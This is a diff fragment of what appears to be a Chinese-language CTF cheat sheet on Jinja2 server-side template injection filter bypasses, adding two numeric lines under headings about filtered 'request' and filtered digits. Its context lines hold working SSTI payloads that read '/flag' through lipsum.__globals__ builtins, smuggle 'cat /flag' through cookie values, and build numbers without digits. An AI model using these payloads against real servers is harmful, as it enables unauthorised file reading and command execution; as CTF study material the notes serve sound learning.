@@ -245,6 +245,7 @@ Cookie:a=__globals__;b=os;c=cat /flag
 
 ^
 ## **过滤了request**
+369
 替换字符
 ```
 lipsum.__globals__['__builtins__'].open('/flag').read()
@@ -272,6 +273,7 @@ lipsum.__globals__['__builtins__'].open('/flag').read()
 
 ^
 ## **过滤数字**
+370
 ```
 {%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
 {%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}
